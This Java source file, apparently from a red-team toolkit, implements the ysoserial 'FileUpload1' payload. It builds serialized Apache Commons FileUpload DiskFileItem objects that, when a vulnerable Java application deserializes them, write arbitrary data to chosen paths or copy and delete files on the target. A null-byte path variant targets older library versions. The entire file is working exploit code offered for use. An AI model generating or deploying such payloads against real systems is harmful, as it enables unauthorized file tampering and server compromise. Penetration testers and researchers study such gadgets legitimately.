package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.apache.commons.io.output.ThresholdingOutputStream;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

@Dependencies({
        "commons-fileupload:commons-fileupload:1.3.1",
        "commons-io:commons-io:2.4"
})
@PayloadTest(harness = "ysoserial.test.payloads.FileUploadTest", precondition = "isApplicableJavaVersion", flaky = "possible race condition")
@Authors({Authors.MBECHLER})
public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    public DiskFileItem getObject(String command) throws Exception {
        String[] parts = command.split(";");
        if (parts.length == 3 && "copyAndDelete".equals(parts[0])) {
            return copyAndDelete(parts[1], parts[2]);
        } else if (parts.length == 3 && "write".equals(parts[0])) {
            return write(parts[1], parts[2].getBytes("US-ASCII"));
        } else if (parts.length == 3 && "writeB64".equals(parts[0])) {
            return write(parts[1], Base64.decodeBase64(parts[2]));
        } else if (parts.length == 3 && "writeOld".equals(parts[0])) {
            return writePre131(parts[1], parts[2].getBytes("US-ASCII"));
        } else if (parts.length == 3 && "writeOldB64".equals(parts[0])) {
            return writePre131(parts[1], Base64.decodeBase64(parts[2]));
        }
        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
    }

    public void release(DiskFileItem obj) throws Exception {
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, null);
        Reflections.setFieldValue(obj, "dfos", dfos);
    }

    private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }

    private static DiskFileItem write(String dir, byte[] data) throws Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }

    private static DiskFileItem writePre131(String file, byte[] data) throws Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }

    private static DiskFileItem makePayload(int threshold, String repoPath, String filePath, byte[] data)
            throws IOException, Exception {
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(threshold, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FileUpload1.class, args);
    }
}
